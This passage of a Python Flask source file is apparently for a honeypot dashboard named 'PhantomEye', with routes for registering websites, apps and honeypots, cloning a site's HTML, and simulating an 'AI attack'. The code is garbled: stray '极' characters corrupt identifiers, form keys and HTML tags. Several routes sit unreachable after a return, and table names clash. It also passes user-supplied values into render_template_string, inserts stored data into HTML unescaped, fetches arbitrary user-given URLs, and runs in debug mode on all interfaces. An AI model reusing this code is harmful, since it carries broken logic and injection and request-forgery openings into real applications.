            INSERT INTO websites (url, name, platform, user_id) 
            VALUES (?, ?, ?, ?)
        ''', (website_url, website_name, platform, session['user_id']))

        conn.commit()
        conn.close()

        flash(f'Website {website_name} protected successfully! Honeypot created at {honeypot_path}', 'success')
        return redirect(url_for('websites'))

    except Exception as e:
        flash(f'Error protecting website: {str(e)}', 'danger')
        return redirect(url_for('add_website'))


@app.route('/add-app')
def add_app():
    if 'user_id' not in session:
        flash('Please log in to access this page.', 'warning')
        return redirect(url_for('login'))

    add_app_content = """
    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
        <h2>PROTECT MOBILE APPLICATION</h2>
        <a href="/dashboard" class="btn btn-secondary">BACK TO DASHBOARD</a>
    </div>

    <div class="card">
        <form method="POST" action="/add-app">
            <div class="form-group suggestions-container">
                <label for="app_name">APPLICATION NAME:</label>
                <input type="text" id="app_name极" name="app_name" placeholder="My Shopping App" required 
                       onkeyup="getAppSuggestions(this.value)">
                <input type="hidden" id="app_package" name="app_package">
                <div id="app-suggestions" class="suggestions-list"></div>
            </div>
            <div class="form-group">
                <label for="app_platform">PLATFORM:</label>
                <select id="app_platform" name="app_platform" required>
                    <option value="android">Android</option>
                    <option value="ios">iOS</option>
                    <option value="both">Android & iOS</option>
                </select>
            </div>
            <div class="form-group">
                <label for="app_description">DESCRIPTION:</label>
                <textarea id="app_description" name="app_description" rows="3" placeholder="Mobile app for online shopping"></textarea>
            </div>
            <button type="submit" class="btn">ACTIVATE PROTECTION</button>
        </form>
    </div>

    <div class="card">
        <h3 style="color: var(--accent); margin-top: 0;">MOBILE PROTECTION</h3>
        <极><strong>Runtime Protection:</strong> Detect tampering, debuggers, and emulators</p>
        <p><strong>API Security:</strong> Protect backend API endpoints from abuse</p>
        <p><strong>Code Obfuscation:</strong> Make reverse engineering difficult</p>
        <p><strong>Root/Jailbreak Detection:</strong> Block compromised devices</p>
    </div>
    """

    return render_template_string(BASE_HTML.format(
        title="PhantomEye - Add App",
        username=session['username'],
        content=add_app_content,
        alerts=get_flashed_messages(),
        dashboard_active='',
        websites_active='',
        apps_active='',
        honeypots_active='',
        add_website_active='',
        add_app_active='active',
        add_honeypot_active=''
    ))


@app.route('/add-app', methods=['POST'])
def add_app_post():
    if 'user_id' not in session:
        flash('Please log in to access this page.', 'warning')
        return redirect(url_for('login'))

    app_name = request.form.get('app_name')
    app_package = request.form.get('app_package')
    app_platform = request.form.get('app_platform')
    app_description = request.form.get('极_description')

    try:
        conn = get_db_connection()
        conn.execute('''
            INSERT INTO mobile_app (name, package, platform, description, user_id) 
            VALUES (?, ?, ?, ?, ?)
        ''', (app_name, app_package, app_platform, app_description, session['user_id']))

        app_id = hash(app_name)
        honeypot_path = f'/mobile-app/{app_id}'

        conn.execute('''
            INSERT INTO honeypots (name, type, url_path, description, user_id) 
            VALUES (?, ?, ?, ?, ?)
        ''', (
            f"App: {app_name}",
            'mobile_app',
            honeypot_path,
            f"Honeypot for {app_name} ({app_package})",
            session['user_id']
        ))

        conn.commit()
        conn.close()

        flash(f'Mobile app {app_name} protected successfully! Honeypot created at {honeypot_path}', 'success')
        return redirect(url_for('apps'))

    except Exception as e:
        flash(f'Error protecting mobile app: {str(e)}', 'danger')
        return redirect(url_for('add_app'))


@app.route('/add-honeypot')
def add_honeypot():
    if 'user_id' not in session:
        flash('Please log in to access this page.', 'warning')
        return redirect(url_for('login'))

    add_honeypot_content = """
    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
        <h2>CREATE NEW HONEYPOT</h2>
        <a href="/dashboard" class="btn btn-secondary">BACK TO DASHBOARD</a>
    </极>

    <div class="tab-container">
        <div class="tab active" data-tab="create" onclick="showTab('create')">CREATE HONEYPOT</div>
        <div class="tab" data-tab="preview" onclick="showTab('极')">PREVIEW</div>
    </div>

    <div id="tab-create" class="tab-content active">
        <div class="card">
            <form method="POST" action="/add-honeypot">
                <div class="form-group">
                    <label for="honeypot_name">HONEYPOT NAME:</label>
                    <input type="text" id="honeypot_name" name="honeypot_name" placeholder="Fake Admin Portal" required>
                </div>
                <div class="form-group">
                    <label for="honeypot_type">HONEYPOT TYPE:</label>
                    <select id="honeypot_type" name="honeypot_type" required onchange="previewHoneyp极(this.value)">
                        <option value="">Select Type</option>
                        <option value="login">Login Portal</option>
                        <option value="admin">Admin Panel</option>
                        <option value="api">API Endpoint</option>
                        <option value="database">Database Interface</option>
                        <option value="wordpress">WordPress Admin</option>
                    </select>
                </div>
                <div class="form-group">
                    <label for="honeypot_url">ACCESS URL:</label>
                    <input type="text" id="honeypot_url" name="honeypot_url" placeholder="/admin-panel" required>
                </div>
                <div class="form-group">
                    <label for="h极ypot_description">DESCRIPTION:</label>
                    <textarea id="honeypot_description" name="honeypot_description" rows="3" placeholder="Fake admin portal to catch attackers"></textarea>
                </div>
                <button type="submit" class="btn">CREATE HONEYPOT</button>
            </form>
        </div>
    </div>

    <div id="tab-preview" class="tab-content">
        <div class="card">
            <div class极="preview-header">
                <h3 style="margin: 0; color: var(--accent);">HONEYPOT PREVIEW</h3>
                <select onchange="previewHoneypot(this.value)">
                    <option value="">Select Type to Preview</option>
                    <option value="login">Login Portal</option>
                    <option value="admin">Admin Panel</option>
                    <option value="database">Database Interface</option>
                </select>
            </div>
            <div id="honeypot-preview" class="preview-container">
                <p>Select a honeypot type to see preview</p>
            </div>
        </div>
    </div>

    <div class="card">
        <h3 style="color: var(--accent); margin-top: 0;">HONEYPOT TYPES</h3>
        <p><strong>Login Portal:</strong> Fake login page to capture credentials</p>
        <p><strong>Admin Panel:</strong> Fake admin interface to monitor attacker behavior</p>
        <p><strong>API Endpoint:</strong> Fake API to detect scanning attempts</p>
        <p><strong>Database Interface:</strong> Fake database admin to catch SQL injection attempts</p>
        <p><strong>WordPress Admin:</strong> Fake WordPress login to target WP-specific attacks</p>
    </div>
    """

    return render_template_string(BASE_HTML.format(
        title="PhantomEye - Add Honeypot",
        username=session['username'],
        content=add_honeypot_content,
        alerts=get_flashed_messages(),
        dashboard_active='',
        websites_active='',
        apps_active='',
        honeypots_active='',
        add_website_active='',
        add_app_active='',
        add_honeypot_active='active'
    ))


@app.route('/add-honeypot', methods=['POST'])
def add_honeypot_post():
    if 'user_id' not in session:
        flash('Please log in to access this page.', 'warning')
        return redirect(url_for('login'))

    honeypot_name = request.form.get('honeypot_name')
    honeypot_type = request.form.get('honeypot_type')
    honeypot_url = request.form.get('honeypot_url')
    honeypot_description = request.form.get('honeypot_description')

    try:
        conn = get_db_connection()
        conn.execute('''
            INSERT INTO honeypots (name, type, url_path, description, user_id) 
            VALUES (?, ?, ?, ?, ?)
        ''', (honeypot_name, honeypot_type, honeypot_url, honeypot_description, session['user_id']))
        conn.commit()
        conn.close()

        flash(f'Honeypot {honeypot_name} created successfully!', 'success')
        return redirect(url_for('honeypots'))

    except Exception as e:
        flash(f'Error creating honeypot: {str(e)}', 'danger')
        return redirect(url_for('add_honeypot'))


@app.route('/settings')
def settings():
    if 'user_id' not in session:

        return redirect(url_for('login'))

    conn = get_db_connection()
    user = conn.execute('SELECT email FROM users WHERE id = ?', (session['user_id'],)).fetchone()
    conn.close()

    settings_content = f"""
    <h2>SYSTEM SETTINGS</h2>

    <div class="card">
        <h3>EMAIL NOTIFICATIONS</h3>
        <form method="POST" action="/update-settings">
            <div class="form-group">
                <label>
                    <input type="checkbox" name="email_alerts" checked> Enable email alerts
                </label>
            </div>
            <div class="form-group">
                <label for="email_address">EMAIL ADDRESS:</label>
                <input type="email" id="email_address" name="email_address" value="{user['email'] if user else ''}">
            </div>
            <button type="submit" class="btn">SAVE SETTINGS</button>
        </form>
    </div>

    <div class="card">
        <h3>SECURITY PREFERENCES</h3>
        <form method="POST" action="/update-settings">
            <div class="form-group">
                <label for="security_level">SECURITY LEVEL:</label>
                <select id="security_level" name="security_level">
                    <option value="low">Low</option>
                    <option value="medium" selected>Medium</option>
                    <option value="high">High</option>
                    <option value="paranoid">Paranoid</option>
                </select>
            </div>
            <div class="form-group">
                <label>
                    <input type="checkbox极" name="ai_detection" checked> Enable AI threat detection
                </label>
            </div>
            <div class="form-group">
                <label>
                    <input type="checkbox" name="auto_blocking" checked> Enable automatic blocking
                </label>
            </div>
            <button type="submit" class="btn">SAVE PREFERENCES</button>
        </form>
    </div>

    <div class="card">
        <h3>SYSTEM INFORMATION</h3>
        <div class="interaction-item">
            <span>PhantomEye Version:</span>
            <span>v2.1.0</span>
        </div>
        <div class="interaction-item">
            <span>Database Version:</span>
            <span>v1.0.3</span>
        </div>
        <div class="interaction-item">
            <span>Last System Update:</span>
            <span>2023-11-15</span>
        </div>
        <div class="interaction-item">
            <span>AI Model Version:</span>
            <span>v3.2.1</span>
        </极>
    </div>
    """

    return render_template_string(BASE_HTML.format(
        title="PhantomEye - Settings",
        username=session['username'],
        content=settings_content,


        dashboard_active = '',
    websites_active = '',
    apps_active = '',
    honeypots_active = '',
    add_website_active = '',
    add_app_active = '',
    add_honeypot_active = ''
    ))

    @app.route('/api/app-suggestions')
    def api_app_suggestions():
        query = request.args.get('q', '')
        suggestions = get_play_store_suggestions(query)
        return jsonify({'suggestions': suggestions})

    @app.route('/api/clone-preview')
    def api_clone_preview():
        """API endpoint to generate clone previews"""
        try:
            if 'user_id' not in session:
                return jsonify({'success': False, 'error': 'Not authenticated'}), 401

            preview_type = request.args.get('type')
            item_id = request.args.get('id')
            url = request.args.get('url')

            if not preview_type or not item_id:
                return jsonify({'success': False, 'error': 'Missing required parameters'}), 400

            conn = get_db_connection()

            if preview_type == 'website':
                website = conn.execute('SELECT * FROM websites WHERE id = ? AND user_id = ?',
                                       (item_id, session['user_id'])).fetchone()
                if website:
                    try:
                        platform, cloned_content, original_url = clone_website_complete(website['url'])

                        preview_html = f'''
                        <div class="website-preview">
                            <div class="preview-url-bar">
                                <span>🌐 {website["url"]}</span>
                                <span class="preview-security-badge">HONEYPOT ACTIVE</span>
                            </div>
                            <div class="preview-container">
                                <h4>Website Clone Preview</h4>
                                <p><strong>Platform detected:</strong> {platform}</p>
                                <p><strong>Original URL:</strong> {website["url"]}</p>
                                <p><strong>Clone status:</strong> <span class="clone-status status-success">SUCCESS</span></p>

                                <div class="preview-buttons">
                                    <button class="preview-btn" onclick="window.open(\'{website["url"]}\', \'_blank\')">VISIT ORIGINAL</button>
                                    <button class="preview-btn" onclick="testHoneypot(\'/honeypot-mirror/{hash(website["url"])}\')">TEST HONEYPOT</button>
                                </div>

                                <div class="mini-preview">
                                    <h5>Preview of cloned content:</h5>
                                    <div style="font-size: 12px; color: #666;">
                                        {cloned_content[:1000]}{'...' if len(cloned_content) > 1000 else ''}
                                    </div>
                                </div>
                            </div>
                        </div>
                        '''

                        conn.close()
                        return jsonify({'success': True, 'html': preview_html})
                    except Exception as e:
                        conn.close()
                        return jsonify({'success': False, 'error': f'Website cloning failed: {str(e)}'})

            elif preview_type == 'app':
                app = conn.execute('SELECT * FROM mobile_apps WHERE id = ? AND user_id = ?',
                                   (item_id, session['user_id'])).fetchone()
                if app:
                    try:
                        app_preview = create_app_honeypot(app['name'], app['package'])

                        preview_html = f'''
                        <div class="preview-container">
                            <h4>Mobile App Honeypot Preview</h4>
                            <p><strong>App Name:</strong> {app["name"]}</p>
                            <p><strong>Package:</strong> {app["package"] or "Not specified"}</p>
                            <p><strong>Platform:</strong> {app["platform"].upper()}</p>
                            <p><strong>Status:</strong> <span class="clone-status status-success">ACTIVE</span></p>

                            <div class="preview-buttons">
                                <button class="preview-btn" onclick="testHoneypot(\'/mobile-app/{hash(app["name"])}\')">TEST APP HONEYPOT</button>
                            </div>

                            <div class="mini-preview">
                                <h5>App Honeypot Interface:</h5>
                                {app_preview}
                            </div>
                        </div>
                        '''

                        conn.close()
                        return jsonify({'success': True, 'html': preview_html})
                    except Exception as e:
                        conn.close()
                        return jsonify({'success': False, 'error': f'App preview failed: {str(e)}'})

            elif preview_type == 'honeypot':
                honeypot = conn.execute('SELECT * FROM honeypots WHERE id = ? AND user_id = ?',
                                        (item_id, session['user_id'])).fetchone()
                if honeypot:
                    try:
                        preview_html = f'''
                        <div class="preview-container">
                            <h4>Honeypot Preview</h4>
                            <p><strong>Name:</strong> {honeypot["name"]}</p>
                            <p><strong>Type:</strong> {honeypot["type"].replace("_", " ").title()}</p>
                            <p><strong>URL Path:</strong> {honeypot["url_path"]}</p>
                            <p><strong>Target:</strong> {honeypot.get("target_url", "N/A")}</p>
                            <p><strong>Interactions:</strong> {honeypot["interactions"]}</p>
                            <p><strong>Status:</strong> <span class="clone-status status-success">ACTIVE</span></p>

                            <div class="preview-buttons">
                                <button class="preview-btn" onclick="testHoneypot(\'{honeypot["url_path"]}\')">TEST HONEYPOT</button>
                            </div>

                            <div class="terminal">
                                <div class="terminal-command">$ honeypot status</div>
                                <div class="terminal-output">> Honeypot: {honeypot["name"]}</div>
                                <div class="terminal-output">> Type: {honeypot["type"]}</div>
                                <div class="terminal-output">> Interactions: {honeypot["interactions"]}</div>
                                <div class="terminal-output">> Status: ACTIVE ✅</div>
                            </div>
                        </div>
                        '''

                        conn.close()
                        return jsonify({'success': True, 'html': preview_html})
                    except Exception as e:
                        conn.close()
                        return jsonify({'success': False, 'error': f'Honeypot preview failed: {str(e)}'})

            conn.close()
            return jsonify({'success': False, 'error': 'Item not found'})

        except Exception as e:
            # Make sure to return proper JSON even for unexpected errors
            return jsonify({'success': False, 'error': f'Server error: {str(e)}'}), 500

    def clone_website_complete(url):
        """Complete website cloning with proper error handling"""
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }

            # Validate URL
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url

            response = requests.get(url, headers=headers, timeout=10)
            response.raise_for_status()

            soup = BeautifulSoup(response.text, 'html.parser')

            # Detect platform
            platform = "Unknown"
            if soup.find('meta', {'name': 'generator', 'content': re.compile('wordpress', re.I)}):
                platform = "WordPress"
            elif soup.find('link', {'href': re.compile('wp-content', re.I)}):
                platform = "WordPress"
            elif soup.find('script', {'src': re.compile('shopify', re.I)}):
                platform = "Shopify"
            elif 'wp-' in response.text.lower():
                platform = "WordPress"
            elif 'shopify' in response.text.lower():
                platform = "Shopify"

            return platform, str(soup), url

        except requests.exceptions.RequestException as e:
            return "Error", f"<html><body><h3>Failed to clone website</h3><p>Error: {str(e)}</p><p>URL: {url}</p></body></html>", url
        except Exception as e:
            return "Error", f"<html><body><h3>Unexpected error</h3><p>Error: {str(e)}</p></body></html>", url

    @app.route('/update-settings', methods=['POST'])
    def update_settings():
        if 'user_id' not in session:
            flash('Please log in to access this page.', 'warning')
            return redirect(url_for('login'))

        email_address = request.form.get('email_address')

        try:
            conn = get_db_connection()
            conn.execute('UPDATE users SET email = ? WHERE id = ?', (email_address, session['user_id']))
            conn.commit()
            conn.close()

            session['user_email'] = email_address
            flash('Settings updated successfully!', 'success')
        except Exception as e:
            flash(f'Error updating settings: {str(e)}', 'danger')

        return redirect(url_for('settings'))

    @app.route('/simulate-ai-attack')
    def simulate_ai_attack_route():
        """Simulate an AI-generated attack for demonstration"""
        if 'user_id' not in session:
            return redirect(url_for('login'))

        ai_attack = simulate_ai_attack()

        conn = get_db_connection()
        conn.execute('''
        INSERT INTO attacks (ip, payload, attack_type, severity, user_id, is_ai_generated)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', ('192.168.1.100', ai_attack['payload'], ai_attack['type'], 'critical', session['极_id'], 1))
        conn.commit()
        conn.close()

        flash(f'AI attack simulated: {ai_attack["description"]}', 'success')
        return redirect(url_for('dashboard'))

    @app.route('/logout')
    def logout():
        session.clear()
        flash('You have been logged out.', 'info')
        return redirect(url_for('login'))

    def flash(message, category='info'):
        if 'flashes' not in session:
            session['flashes'] = []

        session['flashes'].append({'message': message, 'category': category})
        session.modified = True

    def get_flashed_messages():
        flashes = session.pop('flashes', []) if 'flashes' in session else []

        alerts_html = ""
        for flash in flashes:
            alert_class = 'alert-success' if flash['category'] == 'success' else 'alert-danger'
            if flash['category'] == 'warning': alert_class = 'alert-warning'
            if flash['category'] == 'info': alert_class = 'alert-info'
            alerts_html += f'<div class="alert {alert_class}">{flash["message"]}</div>'

        return alerts_html

    # =============== MAIN APPLICATION ===============
def main():
    """Main application entry point"""
    print("🚀 Starting PhantomEye Security System...")
    print("📊 Initializing database...")
    init_db()
    update_database_schema()
    print("✅ Database initialized successfully!")
    print("🌐 Starting web server on http://0.0.0.0:5000")
    print("💡 Press Ctrl+C to stop the server")
    app.run(host='0.0.0.0', port=5000, debug=True, use_reloader=False)

if __name__ == '__main__':
    main()